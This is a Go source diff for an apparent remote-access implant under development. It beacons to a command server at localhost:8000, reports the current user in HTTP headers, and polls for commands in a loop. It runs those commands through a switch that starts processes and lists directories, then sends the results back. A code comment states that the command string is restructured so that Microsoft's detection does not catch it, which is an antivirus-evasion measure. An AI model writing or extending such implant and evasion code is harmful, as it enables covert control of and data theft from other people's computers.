@@ -5,13 +5,56 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
-	"os/exec"
+	"os"
+	"os/user"
 	"strings"
 	"time"
 	"uuid"
 )
 
+func readDir(path string) (contents string) {
+	files, _ := os.ReadDir(path)
+
+	for _, file := range files {
+		contents += file.Name()
+		contents += ", "
+	}
+	fmt.Printf(contents)
+	return
+}
+
+func runCommand(path string) (PID string) {
+	//cmdToRun := path
+	//args := nil
+	procAttr := new(os.ProcAttr)
+	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
+	if process, err := os.StartProcess(path, nil, procAttr); err != nil {
+
+	} else {
+		PID = string(process.Pid)
+	}
+	return
+}
+
+func getCurrentDir() (mydir string) {
+	mydir, err := os.Getwd()
+	if err != nil {
+		fmt.Println(err)
+	}
+	return
+}
+
+func getCurrentUser() (name string) {
+	user, err := user.Current()
+	if err != nil {
+		fmt.Printf(err.Error())
+	}
+	name = user.Username
+	return
+}
+
 func main() {
+
 	// to do
 	// generate random uuid of numbers/letters [all done]
 	// add a user agent with http.requests [all done]
@@ -21,19 +64,15 @@ func main() {
 	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	client := http.Client{}
-	sb1 := "whoami"
 
-	cmd := exec.Command(sb1)
-	// Consider adding here logic to execute these commands under a new process or a child process to avoid crashing the main program if the command errors
-
-	result, _ := cmd.Output()
+	result := getCurrentUser()
 	toSend := string(result)
 	toSend = strings.Replace(toSend, "\n", "", -1)
 	fmt.Printf(toSend)
 
 	//time.Sleep(10)
 	req, err := http.NewRequest("GET", "http://localhost:8000/", nil)
-	req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
+	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
 	resp, err := client.Do(req)
 
 	if err != nil {
@@ -44,7 +83,7 @@ func main() {
 
 	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
 	for true {
-		// current issue is that we're not retrieving and executing the new ocmmand 
+		// current issue is that we're not retrieving and executing the new ocmmand
 		req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err = client.Do(req)
@@ -58,7 +97,7 @@ func main() {
 
 		//Convert the body to type string
 		sb := string(body)
-		for sb == "0"{
+		for sb == "0" {
 			time.Sleep(2 * time.Second)
 			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
@@ -75,11 +114,11 @@ func main() {
 		fmt.Printf(sig + "\n")
 		// This is trying to fix the issue of getting 500 status codes
 		// when the DB is cleared
-		// 
+		//
 		//statusC = string(statusC)
 		fmt.Printf(statusC)
 		fmt.Printf("\n")
-		for statusC == "'500'"{
+		for statusC == "'500'" {
 			time.Sleep(2 * time.Second)
 			req, err = http.NewRequest("GET", "http://localhost:8000/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
@@ -91,16 +130,26 @@ func main() {
 			sb = string(body)
 			statusC = resp.Status
 		}
-		fmt.Printf(sb+"\n")
+		fmt.Printf(sb + "\n")
 
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
-		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
-		cmd := exec.Command(sb1)
+		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
+		sb1 := strings.Split(sb, " ")
 
-		result, jn := cmd.Output()
-		if jn != nil {
-			log.Fatalln(err)
+		// We are turning this into a switch statement
+		// We need to append the results of these functions to the result string
+		// Then we send it
+		switch sb1[0] {
+		case "pwd":
+			result = getCurrentDir()
+		case "gcu":
+			result = getCurrentUser()
+		case "rc":
+			result = runCommand(sb1[1])
+		case "rd":
+			result = readDir(sb1[1])
 		}
+
 		toSend := string(result)
 		fmt.Printf(toSend)
 		toSend = strings.Replace(toSend, "\n", "", -1)
@@ -108,7 +157,7 @@ func main() {
 
 		time.Sleep(2 * time.Second)
 		req, err = http.NewRequest("GET", "http://localhost:8000/schema", nil)
-		req.Header = http.Header{"APPSESSIONID": {uuid},"Res": {toSend},"User-Agent": {"testing testing"}}
+		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
 		resp, err = client.Do(req)
 		if err != nil {
 			panic(err)
